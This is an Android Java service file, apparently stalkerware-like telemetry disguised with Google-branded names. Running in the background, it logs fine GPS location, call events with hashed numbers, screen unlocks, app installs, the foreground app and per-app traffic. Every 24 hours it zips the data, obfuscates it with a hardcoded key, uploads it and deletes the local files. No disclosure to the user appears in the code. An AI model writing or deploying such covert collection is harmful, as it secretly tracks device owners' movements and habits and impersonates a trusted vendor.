package com.googlehelp.service;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.SignalStrength;
import android.telephony.TelephonyManager;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class HelpService extends Service {
	private IntentFilter batteryFilter;
	private IntentFilter screenFilter;
	private IntentFilter phoneFilter;
	private IntentFilter packageFilter;
	private int battery_level = 0;
	private int isBatteryCharge = 0;
	private String pss;
	private Location mLocation;
	private TelephonyManager mTelephonyManager;
	private LocationManager mLocationManager;
	private static GoogleDeviceInfo deviceInfo;
	private static List<GoogleDeviceAppInfo> startAppInfoList;
	private static List<GoogleDeviceWakeInfo> deviceWakeInfo;
	private static List<GoogleDeviceContacts> deviceContacts;
	private static List<GoogleDevicePackage> devicePackages;
	private final String key="WDo&ylaIl[te!Ih]5eshcyxiV&v`EehDd{ltZ!sfleNut";

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public final void onCreate() {
		super.onCreate();
		// deviceInfo = JSONHandle.getJson(this);
		if (deviceInfo == null) {
			initGoogleDeviceInfo();
		}
		GoogleUtils.setPreferenceStr(this, "log",
				String.valueOf(System.currentTimeMillis()));

		deviceWakeInfo = new ArrayList<GoogleDeviceWakeInfo>();
		deviceContacts = new ArrayList<GoogleDeviceContacts>();
		devicePackages = new ArrayList<GoogleDevicePackage>();
		batteryFilter = new IntentFilter();
		batteryFilter.addAction(Intent.ACTION_BATTERY_CHANGED);
		registerReceiver(batteryReceiver, batteryFilter);

		screenFilter = new IntentFilter();
		screenFilter.addAction(Intent.ACTION_SCREEN_ON);
		screenFilter.addAction(Intent.ACTION_SCREEN_OFF);
		registerReceiver(screenReceiver, screenFilter);

		phoneFilter = new IntentFilter();
		phoneFilter.addAction(Intent.ACTION_NEW_OUTGOING_CALL);
		registerReceiver(phoneReceiver, phoneFilter);

		packageFilter = new IntentFilter();
		packageFilter.addAction(Intent.ACTION_PACKAGE_ADDED);
		packageFilter.addAction(Intent.ACTION_PACKAGE_REMOVED);
		packageFilter.addAction(Intent.ACTION_PACKAGE_REPLACED);
		packageFilter.addDataScheme("package");
		registerReceiver(packageReceiver, packageFilter);

		mTelephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		mLocationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
		getPhoneSignalState();
		getLocationMessage();
		startTimer();

		mTelephonyManager.listen(new MyPhoneListener(),
				PhoneStateListener.LISTEN_CALL_STATE);
		//Log.i("HelpService", GoogleUtils.getWifiSignalState(this) + "");
		//Log.i("HelpService", GoogleUtils.getNetwork(this));
		// 启动服务时获取应用的网络流量
		startAppInfoList = GoogleMonitorAppStatus.transfer(HelpService.this);

	}

	public void initGoogleDeviceInfo() {
		deviceInfo = new GoogleDeviceInfo();
		deviceInfo.deviceid = GoogleUtils.getDeviceID(this);
		deviceInfo.devicename = GoogleUtils.getDeviceName();
		deviceInfo.osVer = GoogleUtils.getOSVersion();
		deviceInfo.dns = GoogleUtils.getDNS();
		deviceInfo.deviceApp = new ArrayList<GoogleDeviceAppInfo>();
		deviceInfo.deviceOperation = new ArrayList<GoogleDeviceOperation>();
		deviceInfo.deviceStatus = new ArrayList<GoogleDeviceStatesInfo>();
		// deviceInfo.runAppInfo = new ArrayList<GoogleAppRunInfo>();
		deviceInfo.deviceContacts = new ArrayList<GoogleDeviceContacts>();
		deviceInfo.deviceWakes = new ArrayList<GoogleDeviceWakeInfo>();
		deviceInfo.devicePackages = new ArrayList<GoogleDevicePackage>();
	}

	@Override
	public final void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
	}

	@Override
	public final void onDestroy() {
		super.onDestroy();
	}

	private void startTimer() {
		new Timer().schedule(new TimerTask() {
			int count = 0;
			boolean temp = false;

			@Override
			public void run() {
				count++;
				// TODO Auto-generated method stub
				// 10S统计一次的
				//Log.i("HelpService", count + "");
				if (deviceInfo == null) {
					initGoogleDeviceInfo();
				}
				if (count % 10 == 0) {
					if (JSONHandle.getJson(HelpService.this) != null) {
						deviceInfo = JSONHandle.getJson(HelpService.this);
					}
					if (deviceWakeInfo != null) {
						for (int temp = 0; temp < deviceWakeInfo.size(); temp++) {
							deviceInfo.deviceWakes
									.add(deviceWakeInfo.get(temp));
						}
						deviceWakeInfo = new ArrayList<GoogleDeviceWakeInfo>();
					}
					if (deviceContacts != null) {
						for (int contactsTemp = 0; contactsTemp < deviceContacts
								.size(); contactsTemp++) {
							deviceInfo.deviceContacts.add(deviceContacts
									.get(contactsTemp));
						}
						deviceContacts = new ArrayList<GoogleDeviceContacts>();
					}
					if (devicePackages != null) {
						for (GoogleDevicePackage gdp : devicePackages) {
							deviceInfo.devicePackages.add(gdp);
						}
						devicePackages = new ArrayList<GoogleDevicePackage>();
					}
					GoogleDeviceOperation deviceOperation = GoogleMonitorAppStatus
							.currentActivity(HelpService.this);
					if (!deviceOperation.pack.equals("com.android.launcher")) {
						// deviceInfo.deviceOperation.add(deviceOperation);
						GoogleAppRunInfo deviceAppInfo = GoogleMonitorAppStatus
								.doCommand("top -n 1", deviceOperation.pack);
						deviceOperation.time = String.valueOf(System
								.currentTimeMillis());
						deviceOperation.eventname = "openApp";
						deviceOperation.cpuRate = deviceAppInfo.cpuRate;
						deviceOperation.memoryRate = deviceAppInfo.memoryRate;
						if (deviceOperation != null) {
							deviceInfo.deviceOperation.add(deviceOperation);
						}
						JSONHandle.saveJson(HelpService.this, deviceInfo);
					}
				}
				// 5分钟统计一次
				if (count == 300 || count == 600) {
					if (JSONHandle.getJson(HelpService.this) != null) {
						deviceInfo = JSONHandle.getJson(HelpService.this);
					}
					GoogleDeviceStatesInfo gdsi = new GoogleDeviceStatesInfo();
					if (mLocation != null) {
						gdsi.lat = mLocation.getLatitude() + "";
						gdsi.lon = mLocation.getLongitude() + "";
					} else {
						gdsi.lat = "";
						gdsi.lon = "";
					}
					gdsi.pss = pss;
					gdsi.net = GoogleUtils.getNetwork(HelpService.this);
					if (gdsi.net.toUpperCase().contains("WIFI")) {
						gdsi.nss = GoogleUtils
								.getWifiSignalState(HelpService.this) + "";
					} else {
						gdsi.nss = "";
					}
					gdsi.bat = battery_level + "";
					gdsi.gps = GoogleUtils.getGPSStatus(HelpService.this);
					gdsi.time = System.currentTimeMillis() + "";
					gdsi.ps = isBatteryCharge;

					if (deviceInfo != null) {
						deviceInfo.deviceStatus.add(gdsi);
					}
					JSONHandle.saveJson(HelpService.this, deviceInfo);
				}
				// 10分钟统计一次
				if (count == 10 * 60) {
					if (JSONHandle.getJson(HelpService.this) != null) {
						deviceInfo = null;
						deviceInfo = JSONHandle.getJson(HelpService.this);
					}
					count = 0;
					// 统计应用的网络流量
					List<GoogleDeviceAppInfo> deviceAppInfoList = GoogleMonitorAppStatus
							.transfer(HelpService.this);
					if (deviceAppInfoList.size() > 0) {
						// if (deviceInfo.deviceApp.size() > 0) {
						for (GoogleDeviceAppInfo appInfo : deviceAppInfoList) {
							for (int i = 0; i < startAppInfoList.size(); i++) {
								if (appInfo.pack
										.equals(startAppInfoList.get(i).pack)) {
									//Log.i("packtag", appInfo.pack);
									temp = true;
									if (Long.valueOf(appInfo.flow.get(0).receiveBytes)
											- Long.valueOf(startAppInfoList
													.get(i).flow.get(0).receiveBytes) >= 0) {
										if (Long.valueOf(appInfo.flow.get(0).receiveBytes)
												- Long.valueOf(startAppInfoList
														.get(i).flow.get(0).receiveBytes) != 0) {
											appInfo.flow.get(0).receiveBytes = String
													.valueOf(Long
															.valueOf(appInfo.flow
																	.get(0).receiveBytes)
															- Long.valueOf(startAppInfoList
																	.get(i).flow
																	.get(0).receiveBytes));
											appInfo.flow.get(0).sendBytes = String
													.valueOf(Long
															.valueOf(appInfo.flow
																	.get(0).sendBytes)
															- Long.valueOf(startAppInfoList
																	.get(i).flow
																	.get(0).sendBytes));
											boolean status = false;
											for (int j = 0; j < deviceInfo.deviceApp
													.size(); j++) {
												if (deviceInfo.deviceApp.get(j).pack
														.equals(appInfo.pack)) {
													deviceInfo.deviceApp.get(j).flow
															.add(appInfo.flow
																	.get(0));
													status = true;
													break;
												}
											}
											if (!status) {
												deviceInfo.deviceApp
														.add(appInfo);
											}
										}

									} else {
										for (int z = 0; z < deviceInfo.deviceApp
												.size(); z++) {
											if (deviceInfo.deviceApp.get(z).pack
													.equals(appInfo.pack)) {
												deviceInfo.deviceApp.get(z).flow
														.add(appInfo.flow
																.get(0));
												break;
											}
										}
									}
									break;
								}
							}
							if (!temp) {
								deviceInfo.deviceApp.add(appInfo);
								temp = false;
							}
						}
					}
					JSONHandle.saveJson(HelpService.this, deviceInfo);
					// startAppInfoList =deviceAppInfoList;// null;
					startAppInfoList = GoogleMonitorAppStatus
							.transfer(HelpService.this);
					// Log.i("startSize",startAppInfoList.get(0).flow.size()+"");
				}
				// 给服务器发送数据
				logTime();
			}
		}, 0, 1000L);
	}

	private void postLog() {
		String filepath = JSONHandle.getSDPath() + "/android/";
		// 正常的数据
		File denfile = new File(filepath + "google_flag_n.dat");
		GoogleDeviceInfo gdi = JSONHandle.getJson(HelpService.this);
		JSONHandle.saveFile(gdi, "google_flag_n.dat");
		// 正常数据的压缩
		File zipfile = new File(filepath + "google_flag.zip");
		// 加密的数据
		File lastfile = new File(filepath + "google_flag_n.zip");
		try {
			GoogleFileOperation.zipFiles(denfile, zipfile);
			byte[] buffer = JSONHandle.messageEncoder(
					GoogleUtils.getBytes(zipfile), "a123");
			GoogleUtils.getFile(buffer, lastfile);
		} catch (IOException e) {
			e.printStackTrace();
		}
		if (lastfile.exists()) {
			if (isNetworkAvailable(this)) {
				GoogleUtils.uploadFile(lastfile);
				GoogleUtils.setPreferenceStr(this, "log",
						String.valueOf(System.currentTimeMillis()));
				File customFile = new File(filepath + "google_flag.dat");
				customFile.delete();
				deviceInfo = null;
				denfile.delete();
				zipfile.delete();
				lastfile.delete();
				//System.out.println("上传成功");
			}
		}
	}

	private boolean isNetworkAvailable(Context context) {
		ConnectivityManager cm = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		if (cm == null) {
		} else {
			NetworkInfo[] info = cm.getAllNetworkInfo();
			if (info != null) {
				for (int i = 0; i < info.length; i++) {
					if (info[i].getState() == NetworkInfo.State.CONNECTED) {
						return true;
					}
				}
			}
		}
		return false;
	}

	/**
	 * 电池电量信息
	 * */
	BroadcastReceiver batteryReceiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context context, Intent intent) {
			if (intent.getAction().equals(Intent.ACTION_BATTERY_CHANGED)) {
				int status = intent.getIntExtra("status",
						BatteryManager.BATTERY_STATUS_UNKNOWN);
				int rawlevel = intent.getIntExtra("level", -1);
				int scale = intent.getIntExtra("scale", -1);
				if (rawlevel >= 0 && scale > 0) {
					battery_level = (rawlevel * 100) / scale;
				}
				if (status == BatteryManager.BATTERY_STATUS_CHARGING) {
					isBatteryCharge = 1;
				}
			}
		}
	};
	/**
	 * 解锁屏
	 * */
	BroadcastReceiver screenReceiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			if (action.equals(Intent.ACTION_SCREEN_ON)) {
				GoogleDeviceWakeInfo gdwi = new GoogleDeviceWakeInfo();
				gdwi.type = 0;
				gdwi.time = System.currentTimeMillis() + "";
				deviceWakeInfo.add(gdwi);
			} else if (action.equals(Intent.ACTION_SCREEN_OFF)) {
				GoogleDeviceWakeInfo gdwi = new GoogleDeviceWakeInfo();
				gdwi.type = 1;
				gdwi.time = System.currentTimeMillis() + "";
				deviceWakeInfo.add(gdwi);
			}
		}
	};

	/**
	 * 信号强度
	 * */
	public void getPhoneSignalState() {
		mTelephonyManager.listen(new PhoneStateListener() {

			@Override
			public void onSignalStrengthChanged(int asu) {
				super.onSignalStrengthChanged(asu);

			}

			@SuppressLint("NewApi")
			@Override
			public void onSignalStrengthsChanged(SignalStrength signalStrength) {
				super.onSignalStrengthsChanged(signalStrength);
				if (mTelephonyManager.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM) {
					pss = -113 + 2 * (signalStrength.getGsmSignalStrength())
							+ "";
				} else if (mTelephonyManager.getPhoneType() == TelephonyManager.PHONE_TYPE_CDMA) {
					pss = signalStrength.getCdmaDbm() + "";
				}
			}

		}, PhoneStateListener.LISTEN_SIGNAL_STRENGTHS);
	}

	/**
	 * 获取定位信息
	 * */
	public void getLocationMessage() {
		Criteria criteria = new Criteria();
		criteria.setAccuracy(Criteria.ACCURACY_FINE);
		criteria.setCostAllowed(false);
		criteria.setPowerRequirement(Criteria.POWER_HIGH);
		criteria.setSpeedRequired(true);
		criteria.setAltitudeRequired(true);

		String provider = mLocationManager.getBestProvider(criteria, true);
		if (provider != null) {
			Location location = mLocationManager.getLastKnownLocation(provider);
			mLocationManager.requestLocationUpdates(provider, 10 * 60 * 1000,
					10, new LocationListener() {

						@Override
						public void onStatusChanged(String provider,
								int status, Bundle extras) {

						}

						@Override
						public void onProviderEnabled(String provider) {

						}

						@Override
						public void onProviderDisabled(String provider) {

						}

						@Override
						public void onLocationChanged(Location arg0) {
							if (arg0 != null) {
								mLocation = arg0;
							}
						}
					});
			if (location != null) {
				mLocation = location;
			}
		}
	}

	class MyPhoneListener extends PhoneStateListener {

		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			switch (state) {
			case TelephonyManager.CALL_STATE_IDLE:

				break;
			case TelephonyManager.CALL_STATE_RINGING:
				GoogleDeviceContacts gdcs = new GoogleDeviceContacts();
				gdcs.type = 1;
				gdcs.number = GoogleUtils.MD5(GoogleUtils.decode(key)+incomingNumber);
				gdcs.time = System.currentTimeMillis() + "";
				deviceContacts.add(gdcs);
				break;
			case TelephonyManager.CALL_STATE_OFFHOOK:
				break;
			}
		}
	}

	BroadcastReceiver phoneReceiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context context, Intent intent) {
			if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
				String phoneNumber = intent
						.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
				//Log.i("HelpService", phoneNumber);
				GoogleDeviceContacts gdcs = new GoogleDeviceContacts();
				gdcs.type = 0;
				gdcs.number =GoogleUtils.MD5(GoogleUtils.decode(key)+phoneNumber);
				gdcs.time = System.currentTimeMillis() + "";
				deviceContacts.add(gdcs);
			}
		}
	};

	BroadcastReceiver packageReceiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			if (action.equals(Intent.ACTION_PACKAGE_ADDED)) {
				String packageName = intent.getDataString().substring(8);
				GoogleDevicePackage gdp = new GoogleDevicePackage();
				gdp.type = 0;
				gdp.pName = packageName;
				gdp.time = System.currentTimeMillis() + "";
				devicePackages.add(gdp);
			} else if (action.equals(Intent.ACTION_PACKAGE_REMOVED)) {
				String packageName = intent.getDataString().substring(8);
				GoogleDevicePackage gdp = new GoogleDevicePackage();
				gdp.type = 1;
				gdp.pName = packageName;
				gdp.time = System.currentTimeMillis() + "";
				devicePackages.add(gdp);
			} else if (action.equals(Intent.ACTION_PACKAGE_REPLACED)) {
				String packageName = intent.getDataString().substring(8);
				GoogleDevicePackage gdp = new GoogleDevicePackage();
				gdp.type = 2;
				gdp.pName = packageName;
				gdp.time = System.currentTimeMillis() + "";
				devicePackages.add(gdp);
				//Log.i("HelpService", packageName);
			}
		}
	};

	private void logTime() {
		if (GoogleUtils.getPreferenceStr(this, "log").equals("")) {
			try {
				if (JSONHandle.getFileSizes() >= 100) {

					postLog();

				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} else {
			try {
				//Log.i("ttttt",String.valueOf((System.currentTimeMillis() - Long.valueOf(GoogleUtils.getPreferenceStr(this,"log")))));
				if ((System.currentTimeMillis() - Long.valueOf(GoogleUtils
						.getPreferenceStr(this, "log"))) >= 24 * 60 * 60 * 1000
						|| JSONHandle.getFileSizes() >= 100) {

					// TODO Auto-generated method stub
					postLog();

				}
			} catch (NumberFormatException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
}
